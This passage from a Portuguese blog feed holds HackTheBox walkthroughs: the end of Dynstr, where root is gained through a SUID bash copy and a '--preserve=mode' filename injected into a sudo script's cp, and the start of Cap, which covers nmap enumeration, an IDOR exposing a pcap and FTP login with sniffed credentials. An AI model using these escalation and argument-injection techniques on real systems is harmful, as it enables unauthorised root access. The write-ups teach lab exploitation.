  <li>Copiado o arquivo <code class="language-plaintext highlighter-rouge">/bin/bash</code> para um diretório temporário e ajustado o SUID bit, assim como criado um arquivo <code class="language-plaintext highlighter-rouge">.version</code> contendo uma versão inicial.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp<span class="nv">$ </span><span class="nb">cd</span> <span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">cp</span> /bin/bash <span class="nb">.</span>
bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">chmod </span>u+s bash
bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">echo </span>1 <span class="o">&gt;</span> .version
bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 1168
drwx------  2 bindmgr bindmgr    4096 Aug 16 19:22 <span class="nb">.</span>
drwxrwxrwt 13 root    root       4096 Aug 16 19:22 ..
<span class="nt">-rwsr-xr-x</span>  1 bindmgr bindmgr 1183448 Aug 16 19:22 bash
<span class="nt">-rw-rw-r--</span>  1 bindmgr bindmgr       2 Aug 16 19:22 .version
</code></pre></div></div>

<ul>
  <li>Criado também um arquivo chamado <code class="language-plaintext highlighter-rouge">--preserve=mode</code>, de forma que seu nome seja interpretado como um parâmetro para a execução do <code class="language-plaintext highlighter-rouge">cp</code>, copiando o binário <code class="language-plaintext highlighter-rouge">bash</code>, porém mantendo o SUID configurado. Podemos confirmar este comportamento a partir do comando <code class="language-plaintext highlighter-rouge">echo</code>, também abaixo:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> ./--preserve<span class="o">=</span>mode
bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">echo</span> <span class="k">*</span>
bash <span class="nt">--preserve</span><span class="o">=</span>mode
</code></pre></div></div>

<ul>
  <li>Executei o script usando o <code class="language-plaintext highlighter-rouge">sudo</code></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/bindmgr.sh
<span class="nb">sudo</span>: unable to resolve host dynstr.dyna.htb: Name or service not known
<span class="o">[</span>+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.7i6oryDsae.
<span class="o">[</span>+] Creating /etc/bind/named.conf.bindmgr file.
<span class="o">[</span>+] Staging files to /etc/bind/named.bindmgr.
<span class="o">[</span>+] Checking staged configuration.
<span class="o">[</span>-] ERROR: The generated configuration is not valid. Please fix following errors:
    /etc/bind/named.bindmgr/bash:1: unknown option <span class="s1">'ELF...'</span>
    /etc/bind/named.bindmgr/bash:14: unknown option <span class="s1">'hȀE'</span>
    /etc/bind/named.bindmgr/bash:40: unknown option <span class="s1">'YF'</span>
    /etc/bind/named.bindmgr/bash:40: unexpected token near <span class="s1">'}'</span>
</code></pre></div></div>

<ul>
  <li>Executei o binário <code class="language-plaintext highlighter-rouge">bash</code> com o parâmetro <code class="language-plaintext highlighter-rouge">-p</code>, conforme orientado na página <a href="https://gtfobins.github.io/gtfobins/bash/#suid">bash | GTFOBins</a>, o que me permitiu um shell interativo com a conta <code class="language-plaintext highlighter-rouge">root</code>, a partir da qual fui capaz de ler o conteúdo do arquivo <code class="language-plaintext highlighter-rouge">/root/root.txt</code> :smiley:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span>/etc/bind/named.bindmgr/bash <span class="nt">-p</span>
bash-5.0# <span class="nb">ls</span> <span class="nt">-la</span>
total 1172
drwx------  2 bindmgr bindmgr    4096 Aug 16 19:10  <span class="nb">.</span>
drwxrwxrwt 13 root    root       4096 Aug 16 19:09  ..
<span class="nt">-rwsr-xr-x</span>  1 bindmgr bindmgr 1183448 Aug 16 19:10  bash
<span class="nt">-rw-rw-r--</span>  1 bindmgr bindmgr       1 Aug 16 19:10 <span class="s1">'--preserve=mode'</span>
<span class="nt">-rw-rw-r--</span>  1 bindmgr bindmgr       2 Aug 16 19:10  .version
bash-5.0# <span class="nb">cd</span> /root
bash-5.0# <span class="nb">cat </span>root.txt
&lt;redacted&gt;
</code></pre></div></div>

<p>Espero que tenham gostado!</p>

<p>Vejo vocês no próximo post :smile:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Medium" /><category term="HTB Linux" /><summary type="html"><![CDATA[Olá pessoal! A máquina desta semana será Dynstr, outra máquina Linux classificada como mediana do Hack The Box, criada por jkr.]]></summary></entry><entry><title type="html">Walktrough: HTB Cap</title><link href="https://davicruz.com/walkthrough/2021/10/htb-cap" rel="alternate" type="text/html" title="Walktrough: HTB Cap" /><published>2021-10-02T13:00:00-03:00</published><updated>2021-10-02T13:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/10/htb-cap</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/10/htb-cap"><![CDATA[<p>Olá pessoal!</p>

<p>A máquina desta semana será <strong>Cap</strong>, outra máquina Linux classificada como fácil do <a href="https://www.hackthebox.eu/">Hack The Box</a>, criada por  <a href="https://app.hackthebox.eu/users/52045">InfoSecJack</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.</p>

<p><img src="https://i.imgur.com/EP6oOn2.png" alt="HTB Cap" class="align-center" /></p>

<p>Esta máquina foi bem fácil e demonstra o porque de garantir a comunicação segura enquanto acessamos os serviços dentro da organização, maneira utilizada para obter credenciais que, das quais, foi realizado o processo de escalação de privilégios para root.</p>

<h2 id="enumeração">Enumeração</h2>

<p>Como de costume, iniciado com um scan rápido do <code class="language-plaintext highlighter-rouge">nmap</code> para ver os serviços publicados nesta máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.245
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-10 20:04 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.245
Host is up <span class="o">(</span>0.073s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 <span class="o">(</span>RSA<span class="o">)</span>
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Tue, 10 Aug 2021 23:04:20 GMT
|     Connection: close
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Length: 232
|     &lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 3.2 Final//EN"</span><span class="o">&gt;</span>
|     &lt;title&gt;404 Not Found&lt;/title&gt;
|     &lt;h1&gt;Not Found&lt;/h1&gt;
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 10 Aug 2021 23:04:15 GMT
|     Connection: close
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Length: 19386
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html <span class="nv">class</span><span class="o">=</span><span class="s2">"no-js"</span> <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"x-ua-compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"ie=edge"</span><span class="o">&gt;</span>
|     &lt;title&gt;Security Dashboard&lt;/title&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"shortcut icon"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"image/png"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/images/icon/favicon.ico"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/bootstrap.min.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/font-awesome.min.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/themify-icons.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/metisMenu.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/owl.carousel.min.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/slicknav.min.css"</span><span class="o">&gt;</span>
|     &lt;<span class="o">!</span><span class="nt">--</span> amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 10 Aug 2021 23:04:15 GMT
|     Connection: close
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     &lt;html&gt;
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;title&gt;Bad Request&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
|     Invalid HTTP Version &amp;#x27<span class="p">;</span>Invalid HTTP Version: &amp;#x27<span class="p">;</span>RTSP/1.0&amp;#x27<span class="p">;</span>&amp;#x27<span class="p">;</span>
|     &lt;/body&gt;
|_    &lt;/html&gt;
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/10%Time<span class="o">=</span>611305F3%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>GetR
SF:equest,2FE5,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20gunicorn</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20
SF:Tue,</span><span class="se">\x</span><span class="s2">2010</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2023:04:15</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\</span><span class="s2">
SF:nContent-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20193
SF:86</span><span class="se">\r\n\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">no-js</span><span class="se">\"\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\</span><span class="s2">
SF:n</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
SF:0&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">x-ua-compatible</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">ie=edge</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\</span><span class="s2">
SF:x20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;Security</span><span class="se">\x</span><span class="s2">20Dashboard&lt;/title&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\</span><span class="s2">
SF:x20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=device-width,</span><span class="se">\x</span><span class="s2">20initial-scale=
SF:1</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">shortcut</span><span class="se">\x</span><span class="s2">20icon</span><span class="se">\"\x</span><span class="s2">20type=</span><span class="se">\"</span><span class="s2">image
SF:/png</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/images/icon/favicon</span><span class="se">\.</span><span class="s2">ico</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;
SF:link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/bootstrap</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;
SF:</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/fon
SF:t-awesome</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20
SF:href=</span><span class="se">\"</span><span class="s2">/static/css/themify-icons</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=
SF:</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/metisMenu</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
SF:0&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/owl</span><span class="se">\.</span><span class="s2">carousel</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">
SF:css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/c
SF:ss/slicknav</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;!--</span><span class="se">\x</span><span class="s2">20amchar"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOption
SF:s,B3,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20gunicorn</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Tue,</span><span class="se">\x</span><span class="s2">2
SF:010</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2023:04:15</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">Conten
SF:t-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Allow:</span><span class="se">\x</span><span class="s2">20GET,</span><span class="se">\x</span><span class="s2">20HEAD,</span><span class="se">\x</span><span class="s2">20OP
SF:TIONS</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,121,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">2
SF:0400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text
SF:/html</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20196</span><span class="se">\r\n\r\n</span><span class="s2">&lt;html&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;Bad</span><span class="se">\x</span><span class="s2">20Request&lt;/title&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;/head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;body&gt;</span><span class="se">\</span><span class="s2">
SF:n</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;h1&gt;&lt;p&gt;Bad</span><span class="se">\x</span><span class="s2">20Request&lt;/p&gt;&lt;/h1&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20Invali
SF:d</span><span class="se">\x</span><span class="s2">20HTTP</span><span class="se">\x</span><span class="s2">20Version</span><span class="se">\x</span><span class="s2">20&amp;#x27;Invalid</span><span class="se">\x</span><span class="s2">20HTTP</span><span class="se">\x</span><span class="s2">20Version:</span><span class="se">\x</span><span class="s2">20&amp;#x27;RTSP
SF:/1</span><span class="se">\.</span><span class="s2">0&amp;#x27;&amp;#x27;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;/body&gt;</span><span class="se">\n</span><span class="s2">&lt;/html&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,189
SF:,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\x</span><span class="s2">20NOT</span><span class="se">\x</span><span class="s2">20FOUND</span><span class="se">\r\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20gunicorn</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20T
SF:ue,</span><span class="se">\x</span><span class="s2">2010</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2023:04:20</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">
SF:Content-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20232</span><span class="se">\</span><span class="s2">
SF:r</span><span class="se">\n\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20HTML</span><span class="se">\x</span><span class="s2">20PUBLIC</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">-//W3C//DTD</span><span class="se">\x</span><span class="s2">20HTML</span><span class="se">\x</span><span class="s2">203</span><span class="se">\.</span><span class="s2">2</span><span class="se">\x</span><span class="s2">20
SF:Final//EN</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;title&gt;404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Found&lt;/title&gt;</span><span class="se">\n</span><span class="s2">&lt;h1&gt;Not</span><span class="se">\x</span><span class="s2">20Found&lt;/h1&gt;
SF:</span><span class="se">\n</span><span class="s2">&lt;p&gt;The</span><span class="se">\x</span><span class="s2">20requested</span><span class="se">\x</span><span class="s2">20URL</span><span class="se">\x</span><span class="s2">20was</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20found</span><span class="se">\x</span><span class="s2">20on</span><span class="se">\x</span><span class="s2">20the</span><span class="se">\x</span><span class="s2">20ser
SF:ver</span><span class="se">\.\x</span><span class="s2">20If</span><span class="se">\x</span><span class="s2">20you</span><span class="se">\x</span><span class="s2">20entered</span><span class="se">\x</span><span class="s2">20the</span><span class="se">\x</span><span class="s2">20URL</span><span class="se">\x</span><span class="s2">20manually</span><span class="se">\x</span><span class="s2">20please</span><span class="se">\x</span><span class="s2">20ch
SF:eck</span><span class="se">\x</span><span class="s2">20your</span><span class="se">\x</span><span class="s2">20spelling</span><span class="se">\x</span><span class="s2">20and</span><span class="se">\x</span><span class="s2">20try</span><span class="se">\x</span><span class="s2">20again</span><span class="se">\.</span><span class="s2">&lt;/p&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>137.56 seconds
</code></pre></div></div>

<h3 id="80tcp---serviço-http">80/TCP - Serviço HTTP</h3>

<p>Observando a página publicada, podemos ver um painel de monitoramento, com algumas opções à esquerda.</p>

<p><img src="https://i.imgur.com/EVJpbpL.png" alt="HTB Cap - Security Dashboard" class="align-center" /></p>

<p>Inspecionando as opções disponíveis no painel da esquerda, a única funcionalidade interessante foi o <em>Security Snapshot (5 Second PCAP + Analysis)</em>, que sumariza o resultado da coleta de pacotes de comunicação de rede por 5 segundos. Ao selecionar esta opção somos redirecionados para <code class="language-plaintext highlighter-rouge">http://10.10.10.245/capture</code> e logo após 5 segundos, para uma página que exibe os resultados da coleta, neste caso <code class="language-plaintext highlighter-rouge">http://10.10.10.245/data/1</code>. Nesta página também podemos baixar o arquivo <code class="language-plaintext highlighter-rouge">pcap</code> gerado, que poderia ser analizado via linha de comando ou via Wireshark.</p>

<p><img src="https://i.imgur.com/YaUXZ83.png" alt="HTB Cap - Security Snapshot" class="align-center" /></p>

<p>Um ponto interessante é que quando solicitei uma nova captura, a URL de resultado apresentou um número sequencial  (<code class="language-plaintext highlighter-rouge">http://10.10.10.245/data/2</code>), que significa que poderíamos ver outras capturas geradas por terceiros em outro momento.</p>

<p>Considerando que o contador está incrementando, devemos ter algo registrado na entrada “0”, a qual foi confirmada alterando manualmente o endereço na URL onde os status mostram que houve comunicação dado a quantidade de pacotes, podendo existir algum tipo de dado sensível caso a comunicação não tenha ocorrido de forma segura.</p>

<p><img src="https://i.imgur.com/WWyXVKE.png" alt="HTB Cap - Security Snapshot &quot;zero&quot;" class="align-center" /></p>

<p>Analizando o conteúdo utilizando o Wireshark, iniciei por verificar as estatísticas das conversas, conforme abaixo, onde temos 3 streams HTTP (80/TCP) e um para FTP (21/TCP)</p>

<p><img src="https://i.imgur.com/XR922yh.png" alt="HTB Cap - PCAP Statistics" class="align-center" /></p>

<p>Passando por cada um dos TCP streams, o mais interessante foi o último, em que durante a comunicação FTP podemos ver as credenciais informadas pelo usuário <strong>nathan</strong> que baixou o arquivo <code class="language-plaintext highlighter-rouge">notes.txt</code>, que poderia conter algum tipo de informação relevante para a resoluçào da máquina.</p>

<blockquote>
  <p>nathan:Buck3tH4TF0RM3!</p>
</blockquote>

<p><img src="https://i.imgur.com/DQHsTTw.png" alt="HTB Cap - PCAP FTP Stream" class="align-center" /></p>

<h2 id="acesso-inicial-e-user-flag">Acesso inicial e User flag</h2>

<p>Utilizando as credenciais observadas, consegui conectar via FTP e surpreendentemente o diretório raiz da conexão era o home directory de <code class="language-plaintext highlighter-rouge">nathan</code>, onde pude baixar o arquivo <code class="language-plaintext highlighter-rouge">user.txt</code> e ler a flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ftp 10.10.10.245
Connected to 10.10.10.245.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.10.245:zurc<span class="o">)</span>: nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 1001     1001         4096 May 27 09:16 <span class="nb">.</span>
drwxr-xr-x    3 0        0            4096 May 23 19:17 ..
lrwxrwxrwx    1 0        0               9 May 15 21:40 .bash_history -&gt; /dev/null
